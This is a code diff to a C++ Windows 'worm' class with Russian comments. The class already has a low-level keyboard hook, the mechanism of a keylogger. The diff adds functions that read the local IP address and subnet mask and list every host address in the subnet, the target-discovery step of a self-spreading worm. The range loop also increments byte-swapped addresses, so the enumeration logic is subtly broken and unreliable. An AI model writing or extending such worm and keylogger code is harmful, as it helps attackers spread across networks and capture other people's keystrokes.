@@ -1,7 +1,10 @@
 ﻿// worm.cpp
+#pragma comment(lib, "iphlpapi.lib")
 #include "worm.h"
 #include <windows.h>
 #include <set>
+#include <iphlpapi.h> 
+
 
 //std::wstring get_own_path() {
 //    wchar_t buffer[MAX_PATH];
@@ -633,3 +636,60 @@ LRESULT CALLBACK worm::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lPa
     }
     return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
+
+vector<wstring> worm::get_local_ip_and_subnet()
+{
+    vector<wstring> results;
+    IP_ADAPTER_INFO adapterInfo[16];
+    DWORD bufLen = sizeof(adapterInfo);
+    if (GetAdaptersInfo(adapterInfo, &bufLen) != ERROR_SUCCESS)
+        return results;
+
+    PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
+    while (pAdapterInfo) {
+        string ip = pAdapterInfo->IpAddressList.IpAddress.String;
+        string mask = pAdapterInfo->IpAddressList.IpMask.String;
+
+        if (ip != "0.0.0.0") {
+            results.push_back(wstring(ip.begin(), ip.end()));
+            results.push_back(wstring(mask.begin(), mask.end()));
+            break;
+        }
+
+        pAdapterInfo = pAdapterInfo->Next;
+    }
+
+    return results;
+}
+
+vector<wstring> worm::generate_ip_range(const string& ip, const string& mask)
+{
+    vector<wstring> ips;
+
+    // Преобразуем в бинарный вид
+    unsigned long ip_addr = inet_addr(ip.c_str());
+    unsigned long mask_addr = inet_addr(mask.c_str());
+
+    // Находим адрес сети и широковещательный адрес
+    unsigned long network = ip_addr & mask_addr;
+    unsigned long broadcast = network | ~mask_addr;
+
+    // Перебор всех адресов между ними
+    for (unsigned long addr = network + 1; addr < broadcast; ++addr)
+    {
+        in_addr a;
+        a.S_un.S_addr = addr;
+        string ip_str = inet_ntoa(a);
+
+        // Преобразуем string -> wstring
+        wstring ip_ws(ip_str.begin(), ip_str.end());
+        ips.push_back(ip_ws);
+    }
+
+    return ips;
+}
+
+
+
+
+
